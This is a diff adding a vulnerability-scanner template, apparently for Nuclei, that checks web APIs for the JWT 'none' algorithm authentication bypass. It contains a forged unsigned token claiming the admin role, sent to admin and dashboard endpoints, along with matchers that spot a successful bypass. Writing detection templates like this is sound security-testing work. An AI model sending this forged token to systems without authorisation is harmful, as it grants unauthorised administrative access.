@@ -1,0 +1,40 @@
+id: jwt-none-alg-bypass
+
+info:
+  name: JWT None Algorithm Bypass
+  author: ExoShade
+  severity: critical
+  tags: jwt,auth,misconfig
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/admin"
+      - "{{BaseURL}}/api/v1/dashboard"
+      - "{{BaseURL}}/api/user"
+    headers:
+      Authorization: "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9."
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "admin"
+          - "dashboard"
+          - "role"
+          - "user_id"
+        condition: or
+
+      - type: word
+        negative: true
+        words:
+          - "invalid"
+          - "expired"
+          - "unauthorized"
+          - "forbidden"
+        part: body
